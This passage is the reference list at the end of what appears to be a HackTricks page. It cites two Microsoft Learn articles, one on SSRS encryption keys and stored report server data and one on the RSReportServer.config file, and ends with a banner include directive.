- [14] [Microsoft Learn - Encrypted Report Server Data संग्रहीत करना](https://learn.microsoft.com/en-us/sql/reporting-services/install-windows/ssrs-encryption-keys-store-encrypted-report-server-data?view=sql-server-ver16)
- [15] [Microsoft Learn - RSReportServer.config configuration file](https://learn.microsoft.com/en-us/sql/reporting-services/report-server/rsreportserver-config-configuration-file?view=sql-server-ver17)
{{#include ../../banners/hacktricks-training.md}}
